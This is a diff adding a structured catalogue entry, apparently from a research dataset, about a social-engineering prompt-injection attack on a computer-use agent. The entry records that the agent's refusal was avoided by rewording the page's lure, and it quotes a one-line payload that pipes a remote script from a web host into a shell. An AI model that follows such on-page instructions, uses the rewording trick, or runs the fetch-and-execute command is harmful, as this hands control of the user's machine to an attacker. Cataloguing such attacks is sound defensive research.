@@ -1,0 +1,38 @@
+slug: ai-clickfix-computer-use
+id: 2025-006
+title: "AI ClickFix: Social-Engineering TTPs Against Computer-Use Agents"
+authors: Johann Rehberger
+new: true
+date: 2025-05
+category: Agentic/CUA
+target: Claude Computer-Use (claude-3-7-sonnet)
+source:
+  url: https://embracethered.com/blog/posts/2025/ai-clickfix-ttp-claude/
+  venue: Embrace The Red (blog)
+  type: blog
+  snapshot: null
+  archived_at: null
+  sha256: null
+stages:
+  initial_access:
+    value: Indirect (I)
+    justification: The agent reads attacker-controlled GUI content on a webpage and treats the rendered instructions as commands.
+    evidence:
+      quote: These attacks work because state of the art AI systems are susceptible to prompt injection and may follow GUI-based instructions from untrusted content.
+      locator: embracethered.com/blog/posts/2025/ai-clickfix-ttp-claude/
+  privilege_escalation:
+    value: Misc.
+    justification: Refusals were eliminated by rewording the lure so the agent would not classify it as a CAPTCHA hand-off to a human.
+    evidence:
+      quote: Switch the text from “Are you a Human?” to “Are you a Computer?”. This probably tricks Claude to not interpret this as a regular CAPTCHA
+      locator: embracethered.com/blog/posts/2025/ai-clickfix-ttp-claude/
+  reconnaissance: null
+  persistence: null
+  command_control: null
+  lateral_movement: null
+  action_on_objective:
+    value: RCE
+    justification: The agent opens a terminal, pastes the clipboard payload and executes a remote shell script on the host.
+    evidence:
+      quote: const cmd = 'curl -s https://wuzzi.net/computer/oops.html | sh';
+      locator: embracethered.com/blog/posts/2025/ai-clickfix-ttp-claude/
